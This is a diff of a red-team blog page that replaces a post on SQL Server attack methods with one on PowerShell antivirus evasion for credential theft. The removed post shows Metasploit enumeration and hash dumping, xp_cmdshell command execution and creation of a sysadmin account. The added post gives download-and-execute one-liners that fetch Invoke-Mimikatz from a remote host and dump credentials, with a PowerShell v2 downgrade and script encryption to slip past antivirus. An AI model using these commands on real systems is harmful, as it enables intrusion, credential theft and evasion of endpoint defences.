@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Sqlserver common attack methods, Yangsir">
+    <meta name="keywords" content="Powershell bypass catch password, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Sqlserver common attack methods | Yangsir</title>
+    <title>Powershell bypass catch password | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132256320.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Sqlserver common attack methods</h1>
+                    <h1 class="description center-align post-title">Powershell bypass catch password</h1>
                 </div>
             </div>
         </div>
@@ -436,20 +436,16 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/Information-collection/">
-                                <span class="chip bg-color">Information collection</span>
+                            <a href="/tags/Bypass/">
+                                <span class="chip bg-color">Bypass</span>
                             </a>
                         
-                            <a href="/tags/Sqlserver/">
-                                <span class="chip bg-color">Sqlserver</span>
+                            <a href="/tags/Mimikatz/">
+                                <span class="chip bg-color">Mimikatz</span>
                             </a>
                         
-                            <a href="/tags/Database/">
-                                <span class="chip bg-color">Database</span>
-                            </a>
-                        
-                            <a href="/tags/Command-execution/">
-                                <span class="chip bg-color">Command execution</span>
+                            <a href="/tags/Catch-Password/">
+                                <span class="chip bg-color">Catch Password</span>
                             </a>
                         
                     </div>
@@ -460,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Miscellaneous-record/" class="post-category">
-                                Miscellaneous record
+                            <a href="/categories/Learning-record/" class="post-category">
+                                Learning record
                             </a>
                         
                     </div>
@@ -473,28 +469,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-24
+                    2021-07-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-07-24
+                    2021-07-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.3k
+                    286
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    8 Min
+                    1 Min
                 </div>
                 
 
@@ -517,200 +513,49 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Default port 1433, NMAP fingerprint is as follows:
-PORT     STATE SERVICE  VERSION
-1433&#x2F;tcp open  ms-sql-s Microsoft SQL Server 2012 11.00.2100.00; RTM
-| ms-sql-ntlm-info:
-|   Target_Name: ROOTKIT
-|   NetBIOS_Domain_Name: ROOTKIT
-|   NetBIOS_Computer_Name: SRV-WEB-KIT
-|   DNS_Domain_Name: rootkit.org
-|   DNS_Computer_Name: Srv-Web-Kit.rootkit.org
-|   DNS_Tree_Name: rootkit.org
-|_  Product_Version: 6.3.9600
-Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
+                <h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">From a practical point of view, solve the practical problems encountered, simple record, can bypass 360 and HuoRong<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Host script results:
-| ms-sql-info:
-|   192.168.3.73:1433:
-|     Version:
-|       name: Microsoft SQL Server 2012 RTM
-|       number: 11.00.2100.00
-|       Product: Microsoft SQL Server 2012
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">According to PowerShell&#39;s default policy, ps1 scripts are not allowed to execute
 
-<h3 id="The-system-tables"><a href="#The-system-tables" class="headerlink" title="The system tables"></a>The system tables</h3><pre class="line-numbers language-none"><code class="language-none">Master: Records all system-level information
+Get-executionpolicy indicates that the current policy is Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-Model: Template database, such as for database size, collation, recovery model, and other database options, will be used for any database that is later created
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/1.png"></p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">You can change the execution policy with the administrator permission<span class="token punctuation">.</span> <span class="token keyword">Do</span> not ask me why I have the administrator permission<span class="token punctuation">.</span> You can not <span class="token keyword">catch</span> passwords with the normal user
 
-MSDB: Arrange alarm and operation
+<span class="token function">Set-ExecutionPolicy</span> Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-Tempdb: Space to hold temporary objects or intermediate result sets
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/2.png"></p>
+<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="PSV2"><a href="#PSV2" class="headerlink" title="PSV2"></a>PSV2</h3><pre class="line-numbers language-none"><code class="language-none">as we all known the easy way like this
+powershell -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;
 
-Resouce: read-only, containing the attached system objects that are physically persistent in the resource database and appear in sys mode for each database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+now you can use the v2 maybe can bypass some av like this
+powershell -Version 2 -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="Grammar-supplement"><a href="#Grammar-supplement" class="headerlink" title="Grammar supplement"></a>Grammar supplement</h3><pre class="line-numbers language-none"><code class="language-none">View all databases
-SELECT Name FROM Master.. SysDatabases ORDER BY Name
-SELECT name FROM master.dbo.sysdatabases
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/3.png"></p>
+<h3 id="Encode-script"><a href="#Encode-script" class="headerlink" title="Encode script"></a>Encode script</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">as we all know the Powersploit project<span class="token punctuation">,</span> how about use this project to bypass?
 
-View the name of the table
-SELECT * FROM #databaseName#.INFORMATION_SCHEMA.TABLES;
+Here we use the <span class="token function">out-encryptedScript</span> to place the script in the same directory as the MimiKatz script<span class="token punctuation">,</span> and then encrypt it in turn
 
-View service links
-EXEC sp_linkedservers
-SELECT * FROM sys.servers;
+<span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Out-EncryptedScript</span><span class="token punctuation">.</span>ps1
+<span class="token function">Out-EncryptedScript</span> <span class="token operator">-</span>ScriptPath <span class="token punctuation">.</span>\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token operator">-</span>Password woshijiamide <span class="token operator">-</span>Salt safety<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-To view the user
-select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled &#x3D; 1 then &#39;Disabled&#39; else &#39;Enabled&#39; end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id &#x3D; sl.principal_id where sp.type not in (&#39;G&#39;, &#39;R&#39;) order by sp.name;
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/4.png">```</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">let our ps1script up to our tar then like this
 
-Create a user
-CREATE LOGIN yangsir WITH PASSWORD &#x3D; &#39;Yangsirnb123&#39;
-sp_addsrvrolemember &#39;yangsir&#39;, &#39;sysadmin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+powershell<span class="token punctuation">.</span>exe
+<span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">"http://192.168.159.1:8888/Out-EncryptedScript.ps1"</span><span class="token punctuation">)</span> 
+<span class="token namespace">[String]</span> <span class="token variable">$cmd</span> = <span class="token function">Get-Content</span> <span class="token punctuation">.</span>\new1<span class="token punctuation">.</span>ps1
+<span class="token function">Invoke-Expression</span> <span class="token variable">$cmd</span>
+<span class="token variable">$decrypted</span> = de woshijiamide safety
+<span class="token function">Invoke-Expression</span> <span class="token variable">$decrypted</span>
+<span class="token function">Invoke-Mimikatz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Information-collection"><a href="#Information-collection" class="headerlink" title="Information collection"></a>Information collection</h3><h4 id="use-admin-mssql-mssql-enum-domain-accounts-about-domain-account"><a href="#use-admin-mssql-mssql-enum-domain-accounts-about-domain-account" class="headerlink" title="use admin/mssql/mssql_enum_domain_accounts about domain account"></a>use admin/mssql/mssql_enum_domain_accounts about domain account</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_domain_accounts) &gt; run
-[*] Running module against 192.168.3.73
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/5.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">the same way, Of course, both files are put remote, also does not affect the final effect
 
-[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...
-[+] 192.168.3.73:1433 - Connected.
-[*] 192.168.3.73:1433 - SQL Server Name: SRV-WEB-KIT
-[*] 192.168.3.73:1433 - Domain Name: ROOTKIT
-[+] 192.168.3.73:1433 - Found the domain sid: 010500000000000515000000e23e1be0b3ff69b2200c3dd5
-[*] 192.168.3.73:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
-[*] 192.168.3.73:1433 -  - ROOTKIT\Administrator
-[*] 192.168.3.73:1433 -  - ROOTKIT\Guest
-[*] 192.168.3.73:1433 -  - ROOTKIT\krbtgt
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Admins
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Users
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Guests
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Computers
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Controllers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+maybe will get some wrong, but we also can catch PW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="use-admin-mssql-mssql-enum-sql-logins-about-login-user"><a href="#use-admin-mssql-mssql-enum-sql-logins-about-login-user" class="headerlink" title="use admin/mssql/mssql_enum_sql_logins about login user"></a>use admin/mssql/mssql_enum_sql_logins about login user</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_sql_logins) &gt; run
-[*] Running module against 192.168.3.73
-
-[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...
-[+] 192.168.3.73:1433 - Connected.
-[*] 192.168.3.73:1433 - Checking if sa has the sysadmin role...
-[+] 192.168.3.73:1433 - sa is a sysadmin.
-[*] 192.168.3.73:1433 - Setup to fuzz 300 SQL Server logins.
-[*] 192.168.3.73:1433 - Enumerating logins...
-[+] 192.168.3.73:1433 - 35 initial SQL Server logins were found.
-[*] 192.168.3.73:1433 - Verifying the SQL Server logins...
-[+] 192.168.3.73:1433 - 10 SQL Server logins were verified:
-[*] 192.168.3.73:1433 -  - ##MS_PolicyEventProcessingLogin##
-[*] 192.168.3.73:1433 -  - ##MS_PolicyTsqlExecutionLogin##
-[*] 192.168.3.73:1433 -  - NT AUTHORITY\SYSTEM
-[*] 192.168.3.73:1433 -  - NT SERVICE\MSSQLSERVER
-[*] 192.168.3.73:1433 -  - NT SERVICE\SQLSERVERAGENT
-[*] 192.168.3.73:1433 -  - NT SERVICE\SQLWriter
-[*] 192.168.3.73:1433 -  - NT SERVICE\Winmgmt
-[*] 192.168.3.73:1433 -  - ROOTKIT\dbadmin
-[*] 192.168.3.73:1433 -  - ROOTKIT\sqladmin
-[*] 192.168.3.73:1433 -  - sa
-[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data"><a href="#use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data" class="headerlink" title="use auxiliary/admin/mssql/mssql_findandsampledata some interest data"></a>use auxiliary/admin/mssql/mssql_findandsampledata some interest data</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_findandsampledata) &gt; run
-
-[*] 192.168.3.73:1433     - Attempting to connect to the SQL Server at 192.168.3.73:1433...
-[+] 192.168.3.73:1433     - Successfully connected to 192.168.3.73:1433
-[*] 192.168.3.73:1433     - Attempting to retrieve data ...
-[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , Sys_User                      , PassWord                      , nvarchar                      , cfcd208495d565ef66e7dff9f98764, 5
-[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WC_Forum_User                 , PasswordType                  , int                           , 1                             , 1
-[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WM_Users                      , Password                      , nvarchar                      , 123                           , 7
-[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="use-auxiliary-scanner-mssql-mssql-hashdump-get-password"><a href="#use-auxiliary-scanner-mssql-mssql-hashdump-get-password" class="headerlink" title="use auxiliary/scanner/mssql/mssql_hashdump  get password"></a>use auxiliary/scanner/mssql/mssql_hashdump  get password</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(scanner&#x2F;mssql&#x2F;mssql_hashdump) &gt; run
-
-[*] 192.168.3.73:1433     - Instance Name: nil
-[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; sa:020008da5345d7acb57f6e081ab60b39cdd31a939c06d3ad751fa9fcdad7d17d864013f33f6bf013dd74e2559a2b82deb5776167ce4db13632b9d43ca62b17d335320f1e2399
-[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyEventProcessingLogin##:0200ce4fb17bbcb091201639a75dfef7681df56c695e199076214dfee2308db01792cb4266d9e650aeb823d694359f9b32b4250954ae0c399a7f59b33ca68eaa9c43a173adf4
-[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyTsqlExecutionLogin##:0200400c2a7a6af4d09e573e8a6ef82c3d171d3d77103df288f079c35b012b94e8bb6b8c26b6902cd0a3f37419bdab1fb8f83c1d0536e4bd374785c6623907139b1102e9f681
-[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Elevated-privileges"><a href="#Elevated-privileges" class="headerlink" title="Elevated privileges"></a>Elevated privileges</h3><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_escalate_execute_as need IMPERSONATION 
-use admin&#x2F;mssql&#x2F;mssql_escalate_dbowner need dbowner<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command execution"></a>Command execution</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_exec 
-use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payload
-use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler 
-
-msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_exec) &gt; run
-[*] Running module against 192.168.3.73
-
-[*] 192.168.3.73:1433 - The server may have xp_cmdshell disabled, trying to enable it...
-[*] 192.168.3.73:1433 - SQL Query: EXEC master..xp_cmdshell &#39;whoami&#39;
-
- output
- ------
- rootkit\dbadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h4><pre class="line-numbers language-none"><code class="language-none">crackmapexec mssql 192.168.3.73 -d rootkit.org -u sqladmin -p Admin12345 -x &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132256320.png"></p>
-<h4 id="use-xpcmdshell"><a href="#use-xpcmdshell" class="headerlink" title="use xpcmdshell"></a>use xpcmdshell</h4><pre class="line-numbers language-none"><code class="language-none">open xpcmdshell
-sp_configure &#39;show advanced options&#39;, &#39;1&#39;
-RECONFIGURE
-
-sp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;
-RECONFIGURE
-
-then use these
-EXEC master..xp_cmdshell &#39;whoami&#39;
-EXEC xp_cmdshell &quot;whoami&quot;;
-EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132756918.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">get dir
-execute master..xp_dirtree &#39;c:&#39;
-execute master..xp_dirtree &#39;c:&#39;,1 
-execute master..xp_dirtree &#39;c:&#39;,1,1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724134413840.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">python exec
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;getpass&quot;).getuser())&#39;
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))&#39;
-
-
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&#39;
-
-
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;
-import sys
-print(sys.version)
-&#39;
-GO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="sqlserver-amp-smbrelay"><a href="#sqlserver-amp-smbrelay" class="headerlink" title="sqlserver&amp;smbrelay"></a>sqlserver&amp;smbrelay</h3><pre class="line-numbers language-none"><code class="language-none">No relevant environment is currently available
-
-you can read:
-https:&#x2F;&#x2F;www.netspi.com&#x2F;blog&#x2F;technical&#x2F;network-penetration-testing&#x2F;executing-smb-relay-attacks-via-sql-server-using-metasploit&#x2F;
-
-like this:
-msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; options
-
-Module options (auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer):
-
-   Name                 Current Setting  Required  Description
-   ----                 ---------------  --------  -----------
-   PASSWORD             admin            no        The password for the specified username
-   RHOSTS               192.168.3.73     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT                1433             yes       The target port (TCP)
-   SMBPROXY             0.0.0.0          yes       IP of SMB proxy or sniffer.
-   TDSENCRYPTION        false            yes       Use TLS&#x2F;SSL for TDS data &quot;Force Encryption&quot;
-   THREADS              1                yes       The number of concurrent threads (max one per host)
-   USERNAME             sa               no        The username to authenticate as
-   USE_WINDOWS_AUTHENT  true             yes       Use windows authentification (requires DOMAIN option set)
-
-msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targetip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="about-mssqlclient-py"><a href="#about-mssqlclient-py" class="headerlink" title="about mssqlclient.py"></a>about mssqlclient.py</h3><pre class="line-numbers language-none"><code class="language-none">python3 mssqlclient.py -db master -windows-auth rootkit.org&#x2F;sqladmin:Admin12345@192.168.3.73<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724135209969.png"></p>
-<h3 id="about-sqsh"><a href="#about-sqsh" class="headerlink" title="about sqsh"></a>about sqsh</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724140056645.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png"></p>
 
                 
             </div>
@@ -737,7 +582,7 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/24/sqlserver-common-attack-methods/">https://yangsirrr.github.io/2021/07/24/sqlserver-common-attack-methods/</a>
+                    <a href="https://yangsirrr.github.io/2021/07/31/powershell-bypass-catch-password/">https://yangsirrr.github.io/2021/07/31/powershell-bypass-catch-password/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -779,20 +624,16 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/Information-collection/">
-                                    <span class="chip bg-color">Information collection</span>
+                                <a href="/tags/Bypass/">
+                                    <span class="chip bg-color">Bypass</span>
                                 </a>
                             
-                                <a href="/tags/Sqlserver/">
-                                    <span class="chip bg-color">Sqlserver</span>
+                                <a href="/tags/Mimikatz/">
+                                    <span class="chip bg-color">Mimikatz</span>
                                 </a>
                             
-                                <a href="/tags/Database/">
-                                    <span class="chip bg-color">Database</span>
-                                </a>
-                            
-                                <a href="/tags/Command-execution/">
-                                    <span class="chip bg-color">Command execution</span>
+                                <a href="/tags/Catch-Password/">
+                                    <span class="chip bg-color">Catch Password</span>
                                 </a>
                             
                         </div>
@@ -838,16 +679,17 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/07/26/proxylogon-utilization-method/">
+                <a href="/2021/07/31/powershell-bypass-catch-password/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png" class="responsive-img" alt="ProxyLogon Utilization method">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png" class="responsive-img" alt="Powershell bypass catch password">
                         
-                        <span class="card-title">ProxyLogon Utilization method</span>
+                        <span class="card-title">Powershell bypass catch password</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -857,9 +699,70 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Learning-record/" class="post-category">
+                                    Learning record
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Redteam/">
+                        <span class="chip bg-color">Redteam</span>
+                    </a>
+                    
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
+                    </a>
+                    
+                    <a href="/tags/Mimikatz/">
+                        <span class="chip bg-color">Mimikatz</span>
+                    </a>
+                    
+                    <a href="/tags/Catch-Password/">
+                        <span class="chip bg-color">Catch Password</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/30/exchange-export-email-methods/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png" class="responsive-img" alt="Exchange Export email methods">
+                        
+                        <span class="card-title">Exchange Export email methods</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -883,76 +786,16 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                         <span class="chip bg-color">Exchange</span>
                     </a>
                     
-                    <a href="/tags/RCE/">
-                        <span class="chip bg-color">RCE</span>
+                    <a href="/tags/Information-collection/">
+                        <span class="chip bg-color">Information collection</span>
                     </a>
                     
-                    <a href="/tags/ProxyLogon/">
-                        <span class="chip bg-color">ProxyLogon</span>
+                    <a href="/tags/Export-Email/">
+                        <span class="chip bg-color">Export Email</span>
                     </a>
                     
-                    <a href="/tags/CVE-2021-26855/">
-                        <span class="chip bg-color">CVE-2021-26855</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2021-27065/">
-                        <span class="chip bg-color">CVE-2021-27065</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/07/23/some-ways-to-download-files-remotely-from-github/">
-                    <div class="card-image">
-                        
